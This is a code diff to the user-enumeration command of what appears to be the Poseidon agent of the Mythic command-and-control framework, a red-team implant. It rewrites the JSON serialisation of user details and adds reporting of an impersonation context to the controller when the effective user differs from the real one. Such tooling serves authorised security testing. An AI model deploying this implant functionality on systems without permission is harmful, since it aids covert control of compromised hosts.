@@ -3,6 +3,7 @@ package getuser
 import (
 	// Standard
 	"encoding/json"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
 	"os/user"
 
 	// Poseidon
@@ -15,23 +16,34 @@ type SerializableUser struct {
 	// On POSIX systems, this is a decimal number representing the uid.
 	// On Windows, this is a security identifier (SID) in a string format.
 	// On Plan 9, this is the contents of /dev/user.
-	Uid string `json:"uid"`
+	Uid string
 	// Gid is the primary group ID.
 	// On POSIX systems, this is a decimal number representing the gid.
 	// On Windows, this is a SID in a string format.
 	// On Plan 9, this is the contents of /dev/user.
-	Gid string `json:"gid"`
+	Gid string
 	// Username is the login name.
-	Username string `json:"username"`
+	Username string
 	// Name is the user's real or display name.
 	// It might be blank.
 	// On POSIX systems, this is the first (or only) entry in the GECOS field
 	// list.
 	// On Windows, this is the user's display name.
 	// On Plan 9, this is the contents of /dev/user.
-	Name string `json:"name"`
+	Name string
 	// HomeDir is the path to the user's home directory (if they have one).
-	HomeDir string `json:"homedir"`
+	HomeDir string
+}
+
+func (e SerializableUser) MarshalJSON() ([]byte, error) {
+	alias := map[string]interface{}{
+		"uid":      e.Uid,
+		"gid":      e.Gid,
+		"username": e.Username,
+		"name":     e.Name,
+		"homedir":  e.HomeDir,
+	}
+	return json.Marshal(&alias)
 }
 
 // Run - Function that executes the shell command
@@ -63,6 +75,13 @@ func Run(task structs.Task) {
 	}
 	msg.UserOutput = string(res)
 	msg.Completed = true
+	effectiveUser := functions.GetEffectiveUser()
+	if effectiveUser != functions.GetUser() {
+		callbackUpdate := structs.CallbackUpdate{
+			ImpersonationContext: &effectiveUser,
+		}
+		msg.CallbackUpdate = &callbackUpdate
+	}
 	task.Job.SendResponses <- msg
 	return
 }
